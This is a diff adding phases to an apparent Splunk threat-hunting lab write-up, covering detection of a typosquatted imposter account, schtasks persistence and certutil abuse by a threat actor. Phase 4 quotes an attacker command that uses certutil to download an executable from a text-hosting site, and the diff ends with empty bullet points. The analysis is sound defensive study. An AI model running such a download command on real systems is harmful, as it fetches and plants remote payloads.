@@ -61,9 +61,43 @@
 
 <br>
 <h3>Phase 2: Identity Analysis & Imposter Detection</h3>
+<p>An audit of the <b>UserName</b> field in the left-hand metadata pane revealed an anomaly: <b>Splunk</b> registered <b>11</b> distinct usernames, whereas corporate documentation only accounted for <b>10</b> legitimate users across the three departments. To expose the hidden identity, a statistical aggregation query was executed:</p>
 
+    index=win_eventlogs
+    | top limit=11 UserName
+    
+<p>The results revealed a high-fidelity indicator of defense evasion via an imposter account: <b>Amel1a</b>. The threat actor used typosquatting (substituting the lowercase letter <b>"i"</b> with the number <b>"1"</b>) to establish a deceptive identity that closely mimicked a legitimate Marketing employee, <b>Amelia</b>.</p>
+<p><img width="959" height="556" alt="image" src="https://github.com/user-attachments/assets/96c77bae-7252-4340-9e92-7b2d4771a82d" />
+</p>
+<p><img width="865" height="890" alt="image" src="https://github.com/user-attachments/assets/e566cc9b-93b2-4e06-9c21-07740230ab60" />
+</p>
 
+<br>
+<h3>Phase 3: Persistence and Reconnaissance Profiling</h3>
+<p>Attention shifted to the HR department to investigate the alerts regarding scheduled tasks and network discovery. By filtering the logs for task scheduling utilities, a specific corporate account was flagged:</p>
+   
+    index=win_eventlogs schtasks
 
+<p>The analysis confirmed that the user <b>Chris.fort</b> from the HR department was actively executing <b>schtasks.exe</b>. This behavior confirmed the threat actor's efforts to establish persistence on the host machine.</p>
+<p><img width="699" height="626" alt="image" src="https://github.com/user-attachments/assets/8be19bef-f554-45f9-a2d9-1b059411f000" />
+</p>
+
+<br>
+<h3>Phase 4: LOLBin Exploitation and Payload Retrieval</h3>
+<p>To identify how the external payload entered the environment, the scope was focused entirely on HR hosts. A query was constructed to analyze the <b>CommandLine</b> field using statistical rare-value filtering, isolating unique command strings that deviated from standard business operations.</p>
+<p>This analysis targeted the user <b>haroon</b>. The data revealed that the threat actor abused a native <b> Windows Living-off-the-Land Binary (LOLBin)</b> — <b>certutil.exe</b> — to bypass traditional application whitelisting and network perimeters.</p>
+<p>On <b>March 4, 2022</b>, the compromised host executed the following command to reach out to the internet, retrieve a payload from a text-hosting platform, and write it to disk:</p>
+
+    certutil.exe -urlcache -f https://controlc.com/e4d11035 benign.exe
+
+<ul>
+  <li><b>Abused Binary:</b> <i>certutil.exe</i> (utilizing the <i>-urlcache</i> flag to download remote files).</li>
+  <li><b></b></li>
+  <li><b></b></li>
+</ul>
+
+<p></p>
+<p></p>
 
 
 
